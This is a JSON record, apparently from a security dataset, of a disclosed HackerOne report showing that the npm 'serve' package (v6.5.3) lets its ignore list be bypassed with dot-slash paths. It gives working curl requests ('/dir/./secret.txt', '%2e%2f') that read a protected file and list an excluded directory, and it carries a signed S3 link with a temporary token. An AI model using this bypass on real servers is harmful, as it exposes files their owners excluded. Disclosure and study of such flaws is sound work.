{
    "reported_to": "Node.js third-party modules",
    "reported_by": "tungpun ",
    "title": "[serve] Directory listing and File access even when they have been set to be ignored (using dot-slash)",
    "content": "\nI would like to report a vulnerability in serve.\nIt allows listing directory and reading local files on the target server.\nModule\nmodule name: serve\nversion: 6.5.3\nnpm page: https://www.npmjs.com/package/serve\nModule Description\nEver wanted to share a project on your network by running just a command? Then this module is exactly what you're looking for: It provides a neat interface for listing the directory's contents and switching into sub folders.\nIn addition, it's also awesome when it comes to serving static sites!\nVulnerability\nSteps To Reproduce:\nInstall serve:\n$ npm i serve\nCreate some child directories, files for demonstration:\n$ mkdir dir\n$ echo \"This is secret content!!\" > dir/secret.txt\n$ mkdir dir/dir2\n$ touch dir/dir2/3.txt\nCreate an application that uses serve for file serving listing and set a few folders and files in the ignore config.\nCode 130 Bytes\n1const serve = require('serve')\n2const server = serve(__dirname, {\n3      port: 6060,\n4      ignore: ['dir/secret.txt', 'dir/dir2']\n5})\nRun the app\n$ node app.js\nNow, the current directory will be served by this module on port 6060 with the exception of file dir/secret.txt and directory 'dir/dir2.\nIf we try to request these ignored files/directories, we get a Not Found error\nCode 68 Bytes\n1$ curl --path-as-is 'http://127.0.0.1:6060/dir/secret.txt'\n2Not Found\nCode 63 Bytes\n1$ curl --path-as-is 'http://127.0.0.1:6060/dir/dir2/'\n2Not Found\nor if we replace e character with URI encoded form %65, it still be ignored:\nCode 70 Bytes\n1$ curl --path-as-is 'http://127.0.0.1:6060/dir/s%65cret.txt'\n2Not Found\nHowever, I found a way to access that file by using dot-slash.\nCode 85 Bytes\n1$ curl --path-as-is 'http://127.0.0.1:6060/dir/./secret.txt'\n2This is secret content!!\nOr listing the directory:\nhttp://127.0.0.1:6060/dir/%2e%2fdir2/\n<image_0>\nSupporting Material/References:\nmacOS High Sierra 10.13.3\nnode v8.10.0\nnpm 5.8.0\nChrome Version 65.0.3325.162 (Official Build) (64-bit)\nWrap up\nI contacted the maintainer to let them know: N\nI opened an issue in the related repository: N\nImpact\nIt bypasses the ignore files/directories feature and allows an attacker to read a file or list the directory that the victim has not allowed access to.\n\n",
    "severity": [
        9.3,
        null
    ],
    "bounty": null,
    "weaknesses": [
        "Information Exposure Through Directory Listing"
    ],
    "screenshots": {
        "image_0": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/279/456/a4e4c2e45fecafc065d60faaa25c8d2010083dcf/serve2.png?response-content-disposition=attachment%3B%20filename%3D%22serve2.png%22%3B%20filename%2A%3DUTF-8%27%27serve2.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQRCLRXFCB%2F20250326%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250326T170656Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEMn%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQDxVo4lqNtm3hXHSOHwVIj42dQ4FG6Kzu6nonwvUe%2FylQIgX7FBKt6IBBTBIEM1eWBOuGM98pnEZ6CxkzvrssVB6%2FIqsgUIMhADGgwwMTM2MTkyNzQ4NDkiDIVbUSW8ZU3FlH%2BQ8yqPBaXkThMLriGYmhivxWG1kR6zMjhbS%2FIhF5pUIuQWyGaIrf9osJZT3B5jwBKsm3BhB%2Bz7bg73ZCmi%2B6nmh5NhNPeJmJFbC%2B6dcIGaP%2Fzi08%2BEbXODgr%2FGNIOrBSeYwfIY7C5vEBMeJixkfErdaOiY8V8GsoL7jFYtGSO7X0OnX3ZHJI4mVh8MB65g9BuPimUoW1RTi0T5jINTmGKt9Y8QI%2B879cYwbdy9UqVjSipce%2F79zK06FLuWdKvGtZ4yRjuw3bgnhy9QJu4IX5D2T%2F%2FCwaV0gnEbhK3Z5xCzFj44lykS1%2B%2Fog7ZypMzhv154KRW7ubqJdkFli3DBlGBi9Rn1EJ4YjHlM6CYHkDCplfL8tPcMxSfWBmcImAyaJNINMUagSbwooyZlmvAuiv6i9VuM%2BbxPoDTVrQUUZOrQzq1uQhO2F7lVZw6OposGrM0NrCzZ3apltziCddWCVE0IFhCn3VwJiW5IZnMUAF2O46RVgw7rm8g91SiLMPRL%2FbO0tCs6ysPgCCHpyYNWKLq07XITGoiz3Nu9xx%2FjFhm917m1dvpeSBpdzV2puGB1DRsWOgieY69hbo74ylzn52LmAQXXGjFB%2BBWE4BprgwAXcA0GyWc9xkwf4NJUMviy3saMx7OdQ4hGPMQfqkG4M9a%2B2ZLolS4NCFrPUaLpSMX5fqbzlMAP2oaahm0IKNYiqRyW4GPfq5sjKNQ3S4OZb%2FrZVC4pCN2r7zN8ixLgRwqy8Qi7YCRDDZAgsLtyKNhNY7GEyGBWhuAfOIAyWETr4fag28jsuFlbo6KyRRGQYIm92FnnbBld5XxwKCshkttXDESC%2BhKYN6v5QCZ4kUosahqIQlh5xfOj%2Fh%2BXY%2F1kFL7A2180Ozkwn9uQvwY6sQFEuK9C5EdAGeChieQ5PmwUWlwumjqNVQADouTc4Rb5yTYX%2FbEA%2Fcr0a39YSlMJJiTAbPihWryxY6f39MCTiCBuDLUFQeYwNV%2FKMPj%2BV0XUIIJTlfMvMYXr6D6ArHcN3%2BkGgpbmIlSIncgCuu2jEoNDbG88W7CDHeOH292I13G90XbWlgeGYKOJ8P5JmIQzY9H6AYuD9G8DAtabj2GdXDHBDCNSTUrl6Iix4U2CPri1IQY%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=16df3bdaba514f7579c0d80aebffaa817a60350b4ab3ae1cc2c4d12299cf244b"
    },
    "disclosed_date": 1527699840,
    "report_url": "https://hackerone.com/reports/330724",
    "is_multi_component": false,
    "complexity": "LOW",
    "novelty": "LOW",
    "vuln_category": "CODE",
    "steps": [
        [
            1,
            "Install serve: `npm i serve`"
        ],
        [
            2,
            "Create test directories and files: `mkdir dir`, `echo \"This is secret content!!\" > dir/secret.txt`, `mkdir dir/dir2`, `touch dir/dir2/3.txt`"
        ],
        [
            3,
            "Create an app using serve with ignore config: `const serve = require('serve'); const server = serve(__dirname, { port: 6060, ignore: ['dir/secret.txt', 'dir/dir2'] });`"
        ],
        [
            4,
            "Run the app: `node app.js`"
        ],
        [
            5,
            "Attempt to access ignored paths normally (fails): `curl --path-as-is 'http://127.0.0.1:6060/dir/secret.txt'`"
        ],
        [
            6,
            "Bypass ignore using dot-slash: `curl --path-as-is 'http://127.0.0.1:6060/dir/./secret.txt'`"
        ]
    ],
    "vuln_description": "The serve package fails to properly enforce ignore rules when paths contain dot-slash sequences (./ or %2e%2f), allowing unauthorized access to files and directories that should be restricted.",
    "reason": "The vulnerability involves a simple path normalization bypass that doesn't require complex interactions or state manipulation. The dot-slash technique is a well-known path traversal method in web security.",
    "new_complexity": "LOW",
    "requires_code": false,
    "requires_CVE": false,
    "is_ctf": false,
    "other_report": null
}